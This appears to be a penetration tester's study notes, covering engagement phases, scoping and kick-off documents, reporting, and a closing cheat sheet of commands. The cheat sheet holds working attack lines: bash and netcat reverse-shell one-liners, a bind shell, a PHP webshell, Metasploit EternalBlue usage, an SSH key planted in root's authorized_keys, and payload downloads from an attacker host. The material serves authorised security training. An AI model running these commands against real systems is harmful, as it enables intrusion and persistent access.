

# Pre-engagement 

educating the client and adjusting the contract. All necessary tests and their components are strictly defined and contractually recorded. In a face-to-face meeting or conference call, many arrangements are made, such as:

1.  Non-Disclosure Agreement
2.  Goals
3.  Scope
4.  Time Estimation
5.  Rules of Engagement



# Stage	Description

1.  Pre-Engagement	
The first step is to create all the necessary documents in the pre-engagement phase, discuss the assessment objectives, and clarify any questions.

2.  Information Gathering	
Once the pre-engagement activities are complete, we investigate the company's existing website we have been assigned to assess. We identify the technologies in use and learn how the web application functions.

3.  Vulnerability Assessment	
With this information, we can look for known vulnerabilities and investigate questionable features that may allow for unintended actions.

4.  Exploitation	
Once we have found potential vulnerabilities, we prepare our exploit code, tools, and environment and test the webserver for these potential vulnerabilities.

5.  Post-Exploitation	
Once we have successfully exploited the target, we jump into information gathering and examine the webserver from the inside. If we find sensitive information during this stage, we try to escalate our privileges (depending on the system and configurations).

6.  Lateral Movement	
If other servers and hosts in the internal network are in scope, we then try to move through the network and access other hosts and servers using the information we have gathered.

7.  Proof-of-Concept	
We create a proof-of-concept that proves that these vulnerabilities exist and potentially even automate the individual steps that trigger these vulnerabilities.

8.  Post-Engagement	
Finally, the documentation is completed and presented to our client as a formal report deliverable. Afterward, we may hold a report walkthrough meeting to clarify anything about our testing or results and provide any needed support to personnel tasked with remediating our findings.


##
##
##

# Prep

Document	Timing for Creation
1. Non-Disclosure Agreement (NDA)	After Initial Contact
2. Scoping Questionnaire	Before the Pre-Engagement Meeting
3. Scoping Document	During the Pre-Engagement Meeting
4. Penetration Testing Proposal (Contract/Scope of Work (SoW))	During the Pre-engagement Meeting
5. Rules of Engagement (RoE)	Before the Kick-Off Meeting
6. Contractors Agreement (Physical Assessments)	Before the Kick-Off Meeting
7. Reports	During and after the conducted Penetration Test

##
##

# Kick-off

The kick-off meeting usually occurs at a scheduled time and in-person after signing all contractual documents. This meeting usually includes client POC(s) (from Internal Audit, Information Security, IT, Governance & Risk, etc., depending on the client), client technical support staff (developers, sysadmins, network engineers, etc.), and the penetration testing team (someone in a management role (such as the Practice Lead), the actual penetration tester(s), and sometimes a Project Manager or even the Sales Account Executive or similar). We will go over the nature of the penetration test and how it will take place. Usually, there is no Denial of Service (DoS) testing. We also explain that if a critical vulnerability is identified, penetration testing activities will be paused, a vulnerability notification report will be generated, and the emergency contacts will be contacted. Typically these are only generated during External Penetration Tests for critical flaws such as unauthenticated remote code execution (RCE), SQL injection, or another flaw that leads to sensitive data disclosure. The purpose of this notification is to allow the client to assess the risk internally and determine if the issue warrants an emergency fix. We would typically only stop an Internal Penetration Test and alert the client if a system becomes unresponsive, we find evidence of illegal activity (such as illegal content on a file share) or the presence of an external threat actor in the network or a prior breach.

Explaining the penetration testing process gives everyone involved a clear idea of our entire process. This demonstrates our professional approach and convinces our questioners that we know what we are doing. Because apart from the technical staff, CTO, and CISO, it will sound like a certain kind of magic that is very difficult for non-technical professionals to understand. So we must be mindful of our audience and target the most technically inexperienced questioner so our approach can be followed by everyone we talk to.

All points related to testing need to be discussed and clarified. It is crucial to respond precisely to the wishes and expectations of the customer/client. Every company structure and network is different and requires an adapted approach. Each client has different goals, and we should adjust our testing to their wishes. We can typically see how experienced our clients are in undergoing penetration tests early in the call, so we may have to shift our focus to explain things in more detail and be prepared to field more questions, or the kickoff call may be very quick and straightforward.

##


# Documentation and Reporting

Before completing the assessment and disconnecting from the client's internal network or sending "stop" notification emails to signal the end of testing (meaning no more interaction with the client's hosts), we must make sure to have adequate documentation for all findings that we plan to include in our report. This includes command output, screenshots, a listing of affected hosts, and anything else specific to the client environment or finding. We should also make sure that we have retrieved all scan and log output if the client hosted a VM in their infrastructure for an internal penetration test and any other data that may be included as part of the report or as supplementary documentation. We should not keep any Personal Identifiable Information (PII), potentially incriminating info, or other sensitive data we came across throughout testing.

We should already have a detailed list of the findings we will include in the report and all necessary details to tailor the findings to the client's environment. Our report deliverable (which is covered in detail in the Documentation & Reporting module) should consist of the following:
```
 -- An attack chain (in the event of full internal compromise or external to internal access) detailing steps taken to achieve compromise
 -- A strong executive summary that a non-technical audience can understand
 -- Detailed findings specific to the client's environment that include a risk rating, finding impact, remediation recommendations, and high-quality external references related to the issue
 -- Adequate steps to reproduce each finding so the team responsible for remediation can understand and test the issue while putting fixes in place
 -- Near, medium, and long-term recommendations specific to the environment
 -- Appendices which include information such as the target scope, OSINT data (if relevant to the engagement), password cracking analysis (if relevant), discovered ports/services, compromised hosts, compromised accounts, files transferred to client-owned systems, any account creation/system modifications, an Active Directory security analysis (if relevant), relevant scan data/supplementary documentation, and any other information necessary to explain a specific finding or recommendation further
At this stage, we will create a draft report that is the first deliverable our client will receive. From here, they will be able to comment on the report and ask for any necessary clarification/modifications.

```

# Obvi

## Basic Tools

| **Command**   | **Description**   |
| --------------|-------------------|
| **General** |
| `sudo openvpn user.ovpn` | Connect to VPN |
| `ifconfig`/`ip a` | Show our IP address |
| `netstat -rn` | Show networks accessible via the VPN |
| `ssh user@10.10.10.10` | SSH to a remote server |
| `ftp 10.129.42.253` | FTP to a remote server |
| **tmux** |
| `tmux` | Start tmux |
| `ctrl+b` | tmux: default prefix |
| `prefix c` | tmux: new window |
| `prefix 1` | tmux: switch to window (`1`) |
| `prefix shift+%` | tmux: split pane vertically |
| `prefix shift+"` | tmux: split pane horizontally |
| `prefix ->` | tmux: switch to the right pane |
| **Vim** |
| `vim file` | vim: open `file` with vim |
| `esc+i` | vim: enter `insert` mode |
| `esc` | vim: back to `normal` mode |
| `x` | vim: Cut character |
| `dw` | vim: Cut word |
| `dd` | vim: Cut full line |
| `yw` | vim: Copy word |
| `yy` | vim: Copy full line |
| `p` | vim: Paste |
| `:1` | vim: Go to line number 1. |
| `:w` | vim: Write the file 'i.e. save' |
| `:q` | vim: Quit |
| `:q!` | vim: Quit without saving |
| `:wq` | vim: Write and quit |

## Pentesting
| **Command**   | **Description**   |
| --------------|-------------------|
| **Service Scanning** |
| `nmap 10.129.42.253` | Run nmap on an IP |
| `nmap -sV -sC -p- 10.129.42.253` | Run an nmap script scan on an IP |
| `locate scripts/citrix` | List various available nmap scripts |
| `nmap --script smb-os-discovery.nse -p445 10.10.10.40` | Run an nmap script on an IP |
| `netcat 10.10.10.10 22` | Grab banner of an open port |
| `smbclient -N -L \\\\10.129.42.253` | List SMB Shares |
| `smbclient \\\\10.129.42.253\\users` | Connect to an SMB share |
| `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0` | Scan SNMP on an IP |
| `onesixtyone -c dict.txt 10.129.42.254` | Brute force SNMP secret string |
| **Web Enumeration** |
| `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt` | Run a directory scan on a website |
| `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt` | Run a sub-domain scan on a website |
| `curl -IL https://www.inlanefreight.com` | Grab website banner |
| `whatweb 10.10.10.121` | List details about the webserver/certificates |
| `curl 10.10.10.121/robots.txt` | List potential directories in `robots.txt` |
| `ctrl+U` | View page source (in Firefox) |
| **Public Exploits** |
| `searchsploit openssh 7.2` | Search for public exploits for a web application |
| `msfconsole` | MSF: Start the Metasploit Framework |
| `search exploit eternalblue` | MSF: Search for public exploits in MSF |
| `use exploit/windows/smb/ms17_010_psexec` | MSF: Start using an MSF module |
| `show options` | MSF: Show required options for an MSF module |
| `set RHOSTS 10.10.10.40` | MSF: Set a value for an MSF module option |
| `check` | MSF: Test if the target server is vulnerable |
| `exploit` | MSF: Run the exploit on the target server is vulnerable |
| **Using Shells** |
| `nc -lvnp 1234` | Start a `nc` listener on a local port |
| `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'` | Send a reverse shell from the remote server |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f` | Another command to send a reverse shell from the remote server |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc -lvp 1234 >/tmp/f` | Start a bind shell on the remote server |
| `nc 10.10.10.1 1234` | Connect to a bind shell started on the remote server |
| `python -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade shell TTY (1) |
| `ctrl+z` then `stty raw -echo` then `fg` then `enter` twice | Upgrade shell TTY (2) |
| `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php` | Create a webshell php file |
| `curl http://SERVER_IP:PORT/shell.php?cmd=id` | Execute a command on an uploaded webshell |
| **Privilege Escalation** |
| `./linpeas.sh` | Run `linpeas` script to enumerate remote server |
| `sudo -l` | List available `sudo` privileges |
| `sudo -u user /bin/echo Hello World!` | Run a command with `sudo` |
| `sudo su -` | Switch to root user (if we have access to `sudo su`) |
| `sudo su user -` | Switch to a user (if we have access to `sudo su`) |
| `ssh-keygen -f key` | Create a new SSH key |
| `echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys` | Add the generated public key to the user |
| `ssh root@10.10.10.10 -i key` | SSH to the server with the generated private key |
| **Transferring Files** |
| `python3 -m http.server 8000` | Start a local webserver |
| `wget http://10.10.14.1:8000/linpeas.sh` | Download a file on the remote server from our local machine |
| `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh` | Download a file on the remote server from our local machine |
| `scp linenum.sh user@remotehost:/tmp/linenum.sh` | Transfer a file to the remote server with `scp` (requires SSH access) |
| `base64 shell -w 0` | Convert a file to `base64` |
| `echo f0VMR...SNIO...InmDwU \| base64 -d > shell` | Convert a file from `base64` back to its orig |
| `md5sum shell` | Check the file's `md5sum` to ensure it converted correctly |

